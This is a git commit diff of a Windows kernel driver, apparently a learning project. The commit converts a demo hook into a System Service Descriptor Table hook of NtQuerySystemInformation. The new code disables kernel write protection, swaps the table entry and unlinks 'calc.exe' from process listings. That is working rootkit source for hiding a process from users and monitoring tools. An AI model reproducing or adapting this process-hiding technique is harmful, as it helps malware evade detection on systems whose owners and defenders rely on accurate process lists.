a5e5a4455bfa6a490665e8c68f00d4456a7513f0
JakubOchnik <jakub.ochnik1@gmail.com>
2021-11-28 19:18:22 +0100

    Refactor

--- driver.c
+++ driver.c
@@ -1,6 +1,6 @@
 #include <ntddk.h>
 
-// The structure representing the System Service Table.
+// Declare the structure representing the System Service Table.
 typedef struct SystemServiceTable
 {
 	PULONG ServiceTableBase; // Array of pointers to functions
@@ -24,19 +24,71 @@ extern PSST KeServiceDescriptorTable;
 #define GetServiceNumber(Function)(*(PULONG)((PUCHAR)Function + 1));
 
  // Define the original prototype of the hooked function
-typedef NTSTATUS(*pNtTerminateProcess)(HANDLE, NTSTATUS);
+NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
+
+typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 
 // Original address of address of function in SSDT
 ULONG SSDTAddress;
 
 // Original function handle
-pNtTerminateProcess NtTerminateProcessOrigHandle = NULL;
+pNtQuerySystemInformation NtQuerySystemInformationOrigHandle = NULL;
+
+// Declare the process information structure
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+	ULONG                   NextEntryOffset;
+	ULONG                   NumberOfThreads;
+	LARGE_INTEGER           Reserved[3];
+	LARGE_INTEGER           CreateTime;
+	LARGE_INTEGER           UserTime;
+	LARGE_INTEGER           KernelTime;
+	UNICODE_STRING          ImageName;
+	KPRIORITY               BasePriority;
+	HANDLE                  ProcessId;
+	HANDLE                  InheritedFromProcessId;
+} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
 
 // Hook function
-NTSTATUS HookNtTerminateProcess(HANDLE hProcess, NTSTATUS ExitStatus)
+NTSTATUS HookNtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-	DbgPrint("Hello, it's me!\n");
-	return NtTerminateProcessOrigHandle(hProcess, ExitStatus);
+	if (SystemInformationClass != 0x05)
+	{
+		// other info was requested, just use the original function
+		return NtQuerySystemInformationOrigHandle(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+	}
+
+	// process info was requested, get the process list from the original function
+	const NTSTATUS ret = NtQuerySystemInformationOrigHandle(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+	if (!NT_SUCCESS(ret))
+	{
+		return ret;
+	}
+	DbgPrint("Hiding the process...\n");
+
+	PSYSTEM_PROCESS_INFORMATION curr = NULL, next = SystemInformation;
+
+	while (next->NextEntryOffset != 0)
+	{
+		// iterate over the list of processes
+		// in order to find the one to hide
+		curr = next;
+		next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
+
+		if (!wcscmp(L"calc.exe", next->ImageName.Buffer))
+		{
+			DbgPrint("Found the calculator!\n");
+			if (next->NextEntryOffset == 0)
+			{
+				curr->NextEntryOffset = 0;
+			}
+			else
+			{
+				curr->NextEntryOffset += next->NextEntryOffset;
+			}
+			next = curr;
+		}
+	}
+	return ret;
 }
 
 // Utility: Enable or disable WP bit in CR0 register
@@ -64,10 +116,10 @@ void Unload(PDRIVER_OBJECT DriverObject)
 {
 	UNREFERENCED_PARAMETER(DriverObject);
 
-	if (NtTerminateProcessOrigHandle != NULL) {
+	if (NtQuerySystemInformationOrigHandle != NULL) {
 		DisableWP();
 		// Revert to the original function address
-		InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)NtTerminateProcessOrigHandle);
+		InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)NtQuerySystemInformationOrigHandle);
 		EnableWP();
 		DbgPrint("The original SSDT function has been restored\n");
 	}
@@ -82,21 +134,23 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	// Assign the function which will be executed on driver exit
 	DriverObject->DriverUnload = Unload;
 
+	DbgPrint("Starting new hook!\n");
+
 	// Get the INDEX of the service in SSDT table using a simple hack
-	const ULONG RoutineIndex = GetServiceNumber(ZwTerminateProcess);
+	const ULONG RoutineIndex = GetServiceNumber(ZwQuerySystemInformation);
 	DisableWP();
 
 	// Calculate the address of address of the routine held in SSDT
 	// addr = KeServiceTableAddress + routine_index * 4 (bytes, address length)
 	SSDTAddress = (ULONG)KeServiceDescriptorTable->ServiceTableBase + RoutineIndex * 4;
 	// Get the absolute address of original routine
-	const ULONG OrigNtTerminateProcess = *(PULONG)SSDTAddress;
+	const ULONG OrigNtQuerySystemInformation = *(PULONG)SSDTAddress;
 
 	// Save the address of original function
-	NtTerminateProcessOrigHandle = (pNtTerminateProcess)OrigNtTerminateProcess;
+	NtQuerySystemInformationOrigHandle = (pNtQuerySystemInformation)OrigNtQuerySystemInformation;
 	// Swap the original address with the hooked function address
 	// Use InterlockedExchange, because it's safer
-	InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)HookNtTerminateProcess);
+	InterlockedExchangePointer((PVOID)SSDTAddress, (PVOID)HookNtQuerySystemInformation);
 
 	// Turn the WP back on
 	EnableWP();
